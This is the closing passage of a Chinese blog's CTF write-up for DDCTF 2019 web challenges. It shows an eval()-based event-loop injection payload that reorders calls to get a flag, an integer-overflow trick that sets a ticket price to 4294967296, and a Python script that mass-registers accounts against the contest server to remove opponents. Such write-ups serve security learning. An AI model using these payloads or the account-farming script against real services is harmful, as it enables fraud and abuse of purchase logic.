+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def buy_handler(args):</span><br><span class="line">	num_items = int(args[0])</span><br><span class="line">	if num_items &lt;= 0: return &apos;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&apos;.format(args[0])</span><br><span class="line">	session[&apos;num_items&apos;] += num_items </span><br><span class="line">	trigger_event([&apos;func:consume_point;&#123;&#125;&apos;.format(num_items), &apos;action:view;index&apos;])</span><br><span class="line">购买的数量小于0会返回错误提示，先加上购买的数量，再执行consume_point_function()函数</span><br><span class="line"></span><br><span class="line">def consume_point_function(args):</span><br><span class="line">	point_to_consume = int(args[0])</span><br><span class="line">	if session[&apos;points&apos;] &lt; point_to_consume: raise RollBackException()</span><br><span class="line">	session[&apos;points&apos;] -= point_to_consume</span><br><span class="line">该函数则是确认是否有足够的金额来购买钻石，如果不够抛出错误异常，够的话将point减去购买钻石的数量。</span><br></pre></td></tr></table></figure>
+<p>可以看到这是典型的先货后款的操作，如果我们在购买完5个钻石之后，在触发报错之前立马调用get_flag_handler()不就可以拿到flag了吗？那如何利用呢？<br>整个函数调用流程是先通过trigger_event将即将执行的函数添加到待调用函数序列中，也就是说我们先传参传入的早，函数就执行的早。<br>我们可以回过头看看execute_event_loop()函数中对参数的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">is_action = event[0] == &apos;a&apos;</span><br><span class="line">			action = get_mid_str(event, &apos;:&apos;, &apos;;&apos;)</span><br><span class="line">			args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;)</span><br><span class="line">			try:</span><br><span class="line">				event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;))</span><br><span class="line">				ret_val = event_handler(args)</span><br></pre></td></tr></table></figure>
+<p>也就是说参数是以#进行分割的，而存在的eval()函数又可以帮助我们利用#注释掉后面的东西，所以这里就达到了调用函数可控的条件，我们可以测试一下。</p>
+<p><img src="/images/26/13.png" alt=""></p>
+<p>可以看到成功利用了，那接着我们是不是可以通过调用trigger_event()函数，先把buy和get_flag传入进去呢？即使buy函数之后的验证函数也得在get_flag之后才能执行了，构造payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;10%23action:get_flag;</span><br></pre></td></tr></table></figure>
+<p>查看cookie中的session，进行解码就能拿到flag了。</p>
+<p><img src="/images/26/14.png" alt=""></p>
+<h2 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h2><p>有注册先注册，登入发现需要购买门票。我们余额只有100元，但是一张票却要2000。这里可以想到整数溢出漏洞。<br>首先抓包修改门票价格。通过测试发现这是32位的服务器，也就是说4294967296溢出变为0。</p>
+<p><img src="/images/26/9.png" alt=""></p>
+<p>可以看到有订单显示了，我们试着支付看看。</p>
+<p><img src="/images/26/10.png" alt=""></p>
+<p>可以看到我们支付成功，并且跳转到了游戏界面。界面中有一个移除对手的功能，点开发现需要得知id以及ticket。<br>说实话我在这里卡住了，尝试了修改json中的数据，但是最后还是自欺欺人，正确的思路应该是不断注册小号，获取id和ticket来进行移除，脚本如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">tmpID = &quot;1&quot;</span><br><span class="line"></span><br><span class="line">tmpSession = requests.session()</span><br><span class="line"></span><br><span class="line">registerURL = &quot;http://117.51.147.155:5050/ctf/api/register?name=Iuhrey&#123;name&#125;&amp;password=12345678aa90&quot;</span><br><span class="line">buyTicketURL = &quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot;</span><br><span class="line">payTicketURL = &quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&#123;bill&#125;&quot;</span><br><span class="line">removeRobotsURL = &quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;uid&#125;&amp;ticket=&#123;ticket&#125;&quot;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Cookie&quot;: &quot;REVEL_SESSION=367aac22fa4d096ee5e45e5e214071cf; user_name=5am3&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def getTicket(tmpID):</span><br><span class="line">    tmpRegisterURL = registerURL.replace(&quot;&#123;name&#125;&quot;,tmpID)</span><br><span class="line">    tmpSession.get(tmpRegisterURL)</span><br><span class="line"></span><br><span class="line">    billID = tmpSession.get(buyTicketURL).json()[&quot;data&quot;][0][&quot;bill_id&quot;]</span><br><span class="line"></span><br><span class="line">    # print(billID)</span><br><span class="line"></span><br><span class="line">    tmpPayTicketURL = payTicketURL.replace(&quot;&#123;bill&#125;&quot;,billID)</span><br><span class="line">    # print(tmpPayTicketURL)</span><br><span class="line">    ticketJson = tmpSession.get(tmpPayTicketURL).json()</span><br><span class="line">    # print(ticketJson)</span><br><span class="line">    ticket,uid = ticketJson[&quot;data&quot;][0].values()</span><br><span class="line"></span><br><span class="line">    return ticket,uid</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    i = 1</span><br><span class="line">    c = 0</span><br><span class="line">    while(i&lt;3 and c &lt; 50):</span><br><span class="line">        name = str(random.randint(1000, 90000))</span><br><span class="line">        c+=1</span><br><span class="line">        try:</span><br><span class="line">            ticket,uid = getTicket(name)</span><br><span class="line">            # print(ticket,uid)</span><br><span class="line"></span><br><span class="line">            tmpRRURL = removeRobotsURL.replace(&quot;&#123;uid&#125;&quot;,str(uid)).replace(&quot;&#123;ticket&#125;&quot;,ticket)</span><br><span class="line">            RRjson = requests.get(tmpRRURL,headers=headers).json()</span><br><span class="line"></span><br><span class="line">            if(RRjson[&quot;data&quot;]):</span><br><span class="line">                print(&quot;[&quot;+str(i)+&quot;] &quot; + str(RRjson[&quot;data&quot;]))</span><br><span class="line">                print(&quot;&quot;)</span><br><span class="line">                i+=1</span><br><span class="line">            time.sleep(1)</span><br><span class="line"></span><br><span class="line">        except:</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/04/17/DDCTF-WEB部分wp/" data-id="cjul6evmc000bw8vjlrkzsd3e" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛总结/">比赛总结</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/03/07/记录搭建docker时踩的一些列坑/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">记录搭建docker时踩的一些列坑</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+  <div id="comments" class="comments">
+    <div id="uyan_frame"></div>
+  </div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2158764"></script>
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Iuhrey的幻想乡</h1>
+    <h2 class="blog-subtitle">记录日常所学</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>幻想乡的起点</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>幻想乡图</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分岔路</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>路标</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">Iuhrey</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>31</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>3</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>14</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
+          喜欢啥几把BB的狗骑驴
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
+          喜欢gay在狗骑驴旁边的狗逼
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
+          gay里gay气的大黄
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
+          郁离歌大手子的博客
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
+          有很多小姐姐的烧包包
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=541131&auto=1&height=66"></iframe>
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2018 - 2019 Iuhrey<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
+      
+    </div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
